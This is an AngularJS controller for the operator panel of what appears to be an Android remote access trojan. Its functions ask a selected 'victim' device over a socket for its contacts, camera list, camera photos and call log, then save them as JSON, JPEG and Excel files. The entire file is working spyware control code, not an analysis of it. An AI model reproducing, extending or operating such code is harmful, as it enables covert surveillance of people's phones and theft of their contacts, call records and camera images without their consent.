angular.module('myappy').controller('LabCtrl', ['$scope', '$rootScope', '$location', function ($scope, $rootScope, $location) {
    $scope.logs = [];
    $scope.barLimit = 100;
    $scope.labTab = $scope.labTab || 'camera'; // default tab

    // Contacts
    $scope.contactsList = [];
    $scope.contactsSize = 0;
    $scope.contactsError = null;

    $scope.getContactsList = function() {
        $scope.contactsList = [];
        $scope.contactsSize = 0;
        $scope.contactsError = null;

        if (!$scope.selectedVictim) {
            $scope.contactsError = "No hay víctima seleccionada.";
            return;
        }

        // Emitir petición al socket
        socket.emit('get-contacts', { victimId: $scope.selectedVictim.id });

        // Esperar respuesta
        socket.once('contacts-data', function(data) {
            $scope.$apply(function() {
                try {
                    let obj = typeof data === "string" ? JSON.parse(data) : data;
                    if (obj.contactsList && Array.isArray(obj.contactsList)) {
                        $scope.contactsList = obj.contactsList;
                        $scope.contactsSize = obj.contactsList.length;
                        $scope.contactsError = null;
                    } else {
                        $scope.contactsList = [];
                        $scope.contactsSize = 0;
                        $scope.contactsError = obj.error || "No se recibieron contactos";
                    }
                } catch(e) {
                    $scope.contactsList = [];
                    $scope.contactsSize = 0;
                    $scope.contactsError = "Error procesando los datos de contactos";
                }
            });
        });
    };

    $scope.saveContacts = function() {
        if (!$scope.contactsList || !$scope.contactsList.length) return;
        const blob = new Blob([JSON.stringify($scope.contactsList, null, 2)], {type:'application/json'});
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = "contacts.json";
        link.click();
    };

    // Cuando cambias de tab, pide los contactos si es la tab de contactos
    $scope.$watch('labTab', function(newTab) {
        if (newTab === 'contacts') {
            $scope.getContactsList();
        }
    });

    // --- EXISTENTE ---
    $scope.close = function () {
        if ($scope.$parent.closeLab) {
            $scope.$parent.closeLab();
        }
    };

    $scope.goToPage = function (page) {
        $location.path('/' + page);
    };

    $scope.addLog = function (msg, color) {
        $scope.logs.push({
            date: new Date().toLocaleString(),
            msg: msg,
            color: color || '#222'
        });
        var logDiv = document.getElementById("logy");
        if (logDiv) {
            logDiv.scrollTop = logDiv.scrollHeight;
        }
    };

    $scope.$watch('selectedVictim', function(newVal) {
        if (newVal) {
            $scope.addLog('Victim seleccionada: ' + (newVal.ip || ''));

            // --- Cámara: cargar lista de cámaras ---
            $scope.cameras = [];
            $scope.selectedCam = null;
            $scope.photo = null;
            $scope.camError = null;
            $scope.isSaveShown = false;

            socket.emit('get-camera-list', { victimId: newVal.id });
            socket.once('camera-list', function(data) {
                console.log('DEBUG RAW camera-list:', data);
                $scope.$apply(function() {
                    try {
                        let obj = typeof data === 'string' ? JSON.parse(data) : data;
                        console.log('DEBUG camera-list obj:', obj);

                        if (obj && Array.isArray(obj.list) && obj.list.length > 0) {
                            $scope.cameras = obj.list.map(cam => ({
                                ...cam,
                                id: String(cam.id)
                            }));
                            $scope.selectedCam = $scope.cameras[0].id;
                            $scope.camError = null;
                            console.log('DEBUG cámaras:', $scope.cameras);
                            console.log('DEBUG selectedCam:', $scope.selectedCam);
                        } else {
                            $scope.cameras = [];
                            $scope.selectedCam = null;
                            if (obj && obj.list && obj.list.length === 0) {
                                $scope.camError = "La víctima no tiene cámaras disponibles.";
                            } else if (obj && obj.error) {
                                $scope.camError = "Error recibido: " + obj.error;
                            } else {
                                $scope.camError = "No se encontraron cámaras disponibles o el agente no respondió correctamente.";
                            }
                            $scope.addLog($scope.camError, "red");
                            console.warn('DEBUG error cámaras:', $scope.camError, obj);
                        }
                    } catch (e) {
                        $scope.cameras = [];
                        $scope.selectedCam = null;
                        $scope.camError = "Error al obtener lista de cámaras: " + e.message;
                        $scope.addLog($scope.camError, "red");
                        console.error('DEBUG catch cámaras:', e, data);
                    }
                });
            });

            // Reset imagen cámara cuando cambia víctima
            $scope.photo = null;
            $scope.isSaveShown = false;
        }
    });

    $scope.increaseLimit = function() {
        if ($scope.callsList && $scope.barLimit < $scope.callsList.length) {
            $scope.barLimit += 50;
        }
    };

    $scope.exportCallsToExcel = function() {
        if (!$scope.callsList || !$scope.callsList.length) return;
        var data = $scope.callsList.map(function(call) {
            return {
                'No. Teléfono': call.phoneNo || '',
                'Nombre': call.name || 'Unknown',
                'Duración': call.duration || '',
                'Tipo': call.type == 1 ? 'INCOMING' : 'OUTGOING'
            };
        });
        var ws = XLSX.utils.json_to_sheet(data);
        var wb = XLSX.utils.book_new();
        XLSX.utils.book_append_sheet(wb, ws, "Llamadas");
        XLSX.writeFile(wb, "registro_llamadas.xlsx");
    };

    // --- Funciones y variables para la cámara ---
    $scope.camChanged = function() {
        console.log('DEBUG camChanged, selectedCam:', $scope.selectedCam, 'typeof:', typeof $scope.selectedCam);
    };

    $scope.snap = function() {
        console.log('DEBUG snap ejecutado, selectedCam:', $scope.selectedCam, 'typeof:', typeof $scope.selectedCam);
        if (!$scope.selectedVictim || ($scope.selectedCam == null || $scope.selectedCam === "")) return;
        $scope.photo = null;
        $scope.camError = null;
        $scope.isSaveShown = false;
        $scope.addLog("Solicitando foto...", "#007bff");

        socket.emit('get-photo', { victimId: $scope.selectedVictim.id, cameraID: $scope.selectedCam });
        socket.once('x0000ca', function(data) {
            console.log('DEBUG respuesta foto:', data);
            $scope.$apply(function() {
                if (data.image && data.buffer) {
                    if (typeof data.buffer === "string" && !data.buffer.startsWith("data:")) {
                        $scope.photo = 'data:image/jpeg;base64,' + data.buffer;
                    } else if (typeof data.buffer === "string") {
                        $scope.photo = data.buffer;
                    } else if (data.buffer instanceof ArrayBuffer || Array.isArray(data.buffer)) {
                        let arr = data.buffer;
                        if (arr instanceof ArrayBuffer) arr = new Uint8Array(arr);
                        let binary = '';
                        for (let i = 0; i < arr.length; i++) {
                            binary += String.fromCharCode(arr[i]);
                        }
                        $scope.photo = 'data:image/jpeg;base64,' + btoa(binary);
                    } else {
                        $scope.photo = null;
                    }
                    $scope.isSaveShown = !!$scope.photo;
                    $scope.camError = null;
                    $scope.addLog("Foto recibida correctamente", "green");
                } else {
                    $scope.photo = null;
                    $scope.isSaveShown = false;
                    $scope.camError = data.error || "Error al recibir foto";
                    $scope.addLog($scope.camError, "red");
                    console.warn('DEBUG error foto:', data);
                }
            });
        });
    };

    $scope.savePhoto = function() {
        if (!$scope.photo) return;
        let link = document.createElement('a');
        link.href = $scope.photo;
        link.download = 'foto_victima.jpg';
        link.click();
        $scope.addLog("Foto guardada", "green");
    };
}]);